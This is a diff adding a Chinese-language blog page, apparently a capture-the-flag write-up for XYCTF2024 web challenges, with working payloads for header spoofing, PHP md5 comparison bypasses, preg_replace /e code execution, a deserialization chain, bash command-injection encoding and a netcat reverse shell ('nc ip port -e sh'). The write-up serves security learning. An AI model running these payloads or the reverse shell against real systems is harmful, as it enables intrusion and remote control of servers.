@@ -1,0 +1,1214 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      XYCTF2024 | Infernity&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="" />
+  <meta name="description" content="blog" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 10,
+      randomYouSrc: '/img/background/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: true,
+	  appId: 'AU8',
+	  appKey: '4cU',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「XYCTF2024」
+		
+	</p>
+
+	
+	
+		<span id="star-button" rel="unlike">
+			<i class="icon-heart"></i>
+		</span>
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-Friends!">
+			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/img/qq.png" target="_blank">
+				<span class="icon-qq"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/img/weixin.jpg" target="_blank">
+				<span class="icon-weixin"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
+				<span class="icon-csdn"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2024/04/09/XYCTF2024/" itemprop="url">
+		XYCTF2024
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2024/04/09/XYCTF2024/" itemprop="url">
+		<time datetime="2024-04-09T11:45:25.000Z" itemprop="dateUpdated">
+	  		2024-04-09
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/WPs/" class=" ">
+			WPs
+		</a>
+	
+		
+			</span>
+			
+			
+
+	
+    <span class="leancloud_visitors" id="/2024/04/09/XYCTF2024/_visitors" data-url="/2024/04/09/XYCTF2024/" data-title="XYCTF2024">
+       	<i class="icon-eye"></i>
+       	热度
+        
+            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
+                   
+    </span>
+    
+
+
+
+	
+    <span class="leancloud_likes" id="/2024/04/09/XYCTF2024/_likes" data-url="/2024/04/09/XYCTF2024/" data-title="XYCTF2024" rel="unlike">
+        <i class="icon-heart"></i>
+        喜欢
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+	
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h1><p>打开是登录页面，先看源码，源码提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 为了防止忘记密码，我把它们放在某个地方了 --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第一反应是robots.txt，进去看看。</p>
+<p><img src="/img/XYCTF2024/image-20240409194805433.png" alt="image-20240409194805433"></p>
+<p>得到&#x2F;l0g1n.txt，进入得到帐号密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: XYCTF</span><br><span class="line">password: @JOILha!wuigqi123$</span><br></pre></td></tr></table></figure>
+
+<p>登录后，开始正常修改http请求头，先抓个包，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">提示：不是 yuanshen.com 来的我不要</span><br><span class="line"></span><br><span class="line">修改：Referer: yuanshen.com</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你用的不是XYCTF的浏览器</span><br><span class="line"></span><br><span class="line">User-Agent: XYCTF</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">非本地用户禁止访问！</span><br><span class="line"></span><br><span class="line">x-forwarded-for:127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xff 打咩！！！</span><br><span class="line"></span><br><span class="line">把x-forwarded-for:127.0.0.1改成Client-ip:127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不是从 ymzx.qq.com 代理来的我不玩</span><br><span class="line"></span><br><span class="line">via:ymzx.qq.com</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有点饿，想吃点XYCTF的小饼干</span><br><span class="line"></span><br><span class="line">Cookie:XYCTF</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">恭喜你拿到flag！</span><br><span class="line">XYCTF&#123;fefa6df3-4e5e-459c-8966-1dfad17cced4&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最终http包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:46497</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>XYCTF</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>48</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>yuanshen.com</span><br><span class="line">Client-ip:127.0.0.1</span><br><span class="line">via:ymzx.qq.com</span><br><span class="line">Cookie:XYCTF</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">username</span>=XYCTF&amp;password=%<span class="number">40</span>JOILha%<span class="number">21</span>wuigqi123%<span class="number">24</span></span></span><br></pre></td></tr></table></figure>
+
+<h1 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h1><p>第一层是md5弱比较</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val1=QNKCDZO&amp;val2=QLTHNDT</span><br></pre></td></tr></table></figure>
+
+<p>第二层$md5 &#x3D;&#x3D; md5($md5)</p>
+<p>所以就是找<strong>自身和md5加密后都是0e开头</strong>，且后面都是纯数字的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5=0e215962017</span><br></pre></td></tr></table></figure>
+
+<p>第三层首先要过$XY &#x3D;&#x3D; $XYCTF</p>
+<p>$XYCTF &#x3D; “Warm up”;给定了，但是有个extract($_GET);可以变量覆盖。所以我们只需要给XY和XYCTF传相同的值即可。然后要过md5弱比较</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$XY != &quot;XYCTF_550102591&quot; &amp;&amp; md5($XY) == md5(&quot;XYCTF_550102591&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>经过查询，发现md5(“XYCTF_550102591”)是0e开头的字符串，那么直接老样子绕过即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XY=QLTHNDT&amp;XYCTF=QLTHNDT</span><br></pre></td></tr></table></figure>
+
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val1=QNKCDZO&amp;val2=QLTHNDT&amp;md5=0e215962017&amp;XY=QLTHNDT&amp;XYCTF=QLTHNDT</span><br></pre></td></tr></table></figure>
+
+<hr style="border: 1px solid black;"/>
+
+<p>下一关：LLeeevvveeelll222.php</p>
+<p>首先要过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!preg_match(&#x27;/[0-9]/&#x27;, $_POST[&#x27;a&#x27;]) &amp;&amp; intval($_POST[&#x27;a&#x27;])</span><br></pre></td></tr></table></figure>
+
+<p>a不能是数字，但是intval会返回1,了解intval函数特性可以知道：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</span><br></pre></td></tr></table></figure>
+
+<p>那么传<strong>a[]&#x3D;a</strong></p>
+<p>下一步执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>这里是preg_replace在&#x2F;e模式下可以任意命令执行的特性。</p>
+<p>补充一下preg_replace的用法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;Visit Microsoft!&#x27;</span>;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/microsoft/i&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="string">&#x27;W3Schools&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出：Visit W3Schools! </span><br></pre></td></tr></table></figure>
+
+<p><strong>preg_replace &#x2F;e 模式下的代码执行</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>],<span class="string">&quot;jutst test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">第二个参数所代表的的内容将被执行</span><br></pre></td></tr></table></figure>
+
+<p>答案很明了了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET：a=/test/e&amp;b=system(&quot;cat%20/flag&quot;)&amp;c=test</span><br><span class="line"></span><br><span class="line">POST：a[]=a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/XYCTF2024/image-20240409201508344.png" alt="image-20240409201508344"></p>
+<h1 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h1><p>让我们上传图片并比较，结合题目名可以猜测应该是比较两个图片的md5值是否相同，用fastcoll工具生成两个相同的图片，然后上传即可。</p>
+<h1 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h1><p>很若至的非预期，出题人居然这个也能忘关flag路由，访问即送flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:39701/flag</span><br></pre></td></tr></table></figure>
+
+<p>正常做法是makefile读取文件内容，在Makefile中，你可以使用$(shell)函数来读取文件内容。</p>
+<p>假设你的文件名为file.txt，你可以使用以下命令来读取文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content := $(shell cat file.txt)</span><br></pre></td></tr></table></figure>
+
+<p>上述命令将文件file.txt的内容存储在变量content中。你可以根据需要将其用于后续的操作。</p>
+<p>如果你需要按行读取文件内容，可以使用$(shell)函数和foreach函数的结合：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lines := $(shell cat file.txt) $(foreach line,$(lines), \ $(info $(line)) \ )</span><br></pre></td></tr></table></figure>
+
+<p>把file.txt改成flag即可。</p>
+<p><img src="/img/XYCTF2024/image-20240409202223072.png" alt="image-20240409202223072"></p>
+<h1 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h1><p>fuzz一下，过滤了较多命令，但是nc未过滤，直接连服务器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip port  -e sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/XYCTF2024/image-20240409202500308.png" alt="image-20240409202500308"></p>
+<h1 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h1><p>过滤了很多命令，但反引号没过滤，可以用反引号当shell_exec()函数执行命令。</p>
+<p>eval前面和后面都有脏数据，最简单的办法是换行和注释绕过。分别在最前和最后加上%0a、%23</p>
+<p>这道题没过滤nc，所以照样可以让这边连我们的服务器。</p>
+<p>因为cmd有长度限制，所以我们可以用$_GET[1]传递参数。</p>
+<p>记得eval中的命令都必须要加分号。</p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23&amp;1=nc ip port  -e sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h1><p>链子很简单，这里不再赘述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CCC-&gt; echo $this-&gt;c;       触发AAA-&gt;__toString()</span><br><span class="line">	AAA-&gt;return $this-&gt;s-&gt;$p;     触发BBB-&gt;__get($name)</span><br><span class="line">		BBB</span><br></pre></td></tr></table></figure>
+
+<p>链子的起点是__destruct() ，而代码中有throw new Exception(“noooooob!!!”); </p>
+<p>这里需要Fast__destruct()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>[<span class="number">0</span>] = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:1&quot;</span>,<span class="string">&quot;i:0&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+
+<p>我们主要看BBB-&gt;__get() 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_POST</span>;                <span class="comment">//注意这里b是一个整个post数组</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line"><span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);             <span class="comment">//这里删除了b数组里我们传入的a的值。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>); </span><br></pre></td></tr></table></figure>
+
+<p>这里直接给答案再分析。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST：a=array_pop&amp;2[]=array_pop</span><br><span class="line">c=array(&quot;system&quot;);</span><br><span class="line">d=&quot;cat /flag&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>array_pop() 函数删除数组中的最后一个元素。并返回最后一个元素。</strong></p>
+<p>第一步变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_pop(array(&quot;array_pop&quot;))(array(&quot;system&quot;))(&quot;cat /flag&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>第二步变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_pop(array(&quot;system&quot;))(&quot;cat /flag&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>第三步变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>最终生成payload的php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>=<span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>] = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:1&quot;</span>,<span class="string">&quot;i:0&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?xy=a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;s:1:&quot;d&quot;;s:9:&quot;cat /flag&quot;;&#125;s:1:&quot;a&quot;;N;&#125;&#125;i:0;N;&#125;</span><br><span class="line">POST：a=array_pop&amp;2[]=array_pop</span><br></pre></td></tr></table></figure>
+
+<h1 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h1><p>安洵杯2020 Web-Bash-Vino0o0o原题削弱版本。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8581?time__1311=n4+xuDgDBDyDRnzD/D0YoQ+q7uI6aCiteD&alichlgref=https://cn.bing.com/#toc-3">https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0YoQ%2Bq7uI6aCiteD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-3</a></p>
+<p>修改一下官方wp里的脚本。</p>
+<p>安洵杯2020 Web-Bash-Vino0o0o这个题数字需要自己构造，但是这里直接给了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">n = dict()</span><br><span class="line">n[0] = &#x27;0&#x27;</span><br><span class="line">n[1] = &#x27;1&#x27;</span><br><span class="line">n[2] = &#x27;2&#x27;</span><br><span class="line">n[3] = &#x27;3&#x27;</span><br><span class="line">n[4] = &#x27;4&#x27;</span><br><span class="line">n[5] = &#x27;5&#x27;</span><br><span class="line">n[6] = &#x27;6&#x27;</span><br><span class="line">n[7] = &#x27;7&#x27;</span><br><span class="line"></span><br><span class="line">f=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def str_to_oct(cmd):                                #命令转换成八进制字符串</span><br><span class="line">    s = &quot;&quot;</span><br><span class="line">    for t in cmd:</span><br><span class="line">        o = (&#x27;%s&#x27; % (oct(ord(t))))[2:]</span><br><span class="line">        s+=&#x27;\\&#x27;+o</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">def build(cmd):                                     #八进制字符串转换成字符</span><br><span class="line">    payload = &quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span><br><span class="line">    s = str_to_oct(cmd).split(&#x27;\\&#x27;)</span><br><span class="line">    for _ in s[1:]:</span><br><span class="line">        payload+=&quot;\\\\&quot;</span><br><span class="line">        for i in _:</span><br><span class="line">            payload+=n[int(i)]</span><br><span class="line">    return payload+&#x27;\\\&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">payload=&quot;cat /f*&quot;</span><br><span class="line">print(build(payload))</span><br></pre></td></tr></table></figure>
+
+<p>打入payload一把嗦。</p>
+<h1 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h1><p>这个题原来的题目描述可没有”说英语”这三个字，真的谜语题了哈。</p>
+<p>登录页面弱口令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:asdqwe</span><br></pre></td></tr></table></figure>
+
+<p>ssti，过滤了大括号，但是汉字就是大括号。</p>
+<p><img src="/img/XYCTF2024/image-20240409211715845.png" alt="image-20240409211715845"></p>
+<p>过滤了很多东西。中括号，下划线，关键函数等，这些都可以用request.args绕过</p>
+<p>其他就是很平常的ssti注入，这里不再赘述。</p>
